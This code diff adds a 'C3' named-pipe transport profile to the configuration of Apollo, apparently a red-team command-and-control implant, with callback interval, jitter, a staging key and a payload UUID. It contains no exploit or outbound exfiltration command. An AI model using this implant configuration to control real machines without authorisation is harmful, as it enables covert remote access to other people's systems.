@@ -5,6 +5,7 @@
 //#define WEBSOCKET
 //#define TCP
 //#define SMB
+//#define C3
 #endif
 
 #if HTTP
@@ -22,6 +23,9 @@ using WebsocketTransport;
 #endif
 #if SMB
 using NamedPipeTransport;
+#endif
+#if C3
+using C3Transport;
 #endif
 #if TCP
 using TcpTransport;
@@ -108,6 +112,29 @@ namespace Apollo
                 }
             },
 #endif
+#if C3
+            { "c3", new C2ProfileData()
+                {
+                    TC2Profile = typeof(C3Profile),
+                    TCryptography = typeof(PSKCryptographyProvider),
+                    TSerializer = typeof(EncryptedJsonSerializer),
+                    Parameters = new Dictionary<string, string>()
+                    {
+#if DEBUG
+                        { "pipename", "ahatojqq-bo0w-oc3r-wqtg-4jf7voepqqbs" },
+                        { "callback_interval", "40" },
+                        { "callback_jitter", "0" },
+                        { "encrypted_exchange_check", "T" },
+#else
+                        { "pipename", "pipename_here" },
+                        { "callback_interval", "callback_interval_here" },
+                        { "callback_jitter", "callback_jitter_here" },
+                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
+#endif
+                    }
+                }
+            },
+#endif
 #if SMB
             { "smb", new C2ProfileData()
                 {
@@ -154,6 +181,8 @@ namespace Apollo
         public static string StagingRSAPrivateKey = "wkskVa0wTi4E3EZ6bi9YyKpbHb01NNDgZ1BXnJJM5io=";
 #elif WEBSOCKET
         public static string StagingRSAPrivateKey = "Hl3IzCYy3io5QU70xjpYyCNrOmA84aWMZLkCwumrAFM=";
+#elif C3
+        public static string StagingRSAPrivateKey = "pvamqNAN2v56eh/SibXQxOZWJCzG0JorUqBpd4+sdlI=";
 #elif SMB
         public static string StagingRSAPrivateKey = "NNLlAegRMB8DIX7EZ1Yb6UlKQ4la90QsisIThCyhfCc=";
 #elif TCP
@@ -163,6 +192,8 @@ namespace Apollo
         public static string PayloadUUID = "b40195db-22e5-4f9f-afc5-2f170c3cc204";
 #elif WEBSOCKET
         public static string PayloadUUID = "7546e204-aae4-42df-b28a-ade1c13594d2";
+#elif C3
+        public static string PayloadUUID = "764a3a8d-21a1-4380-a9b0-4a6dbb266826";
 #elif SMB
         public static string PayloadUUID = "aff94490-1e23-4373-978b-263d9c0a47b3";
 #elif TCP
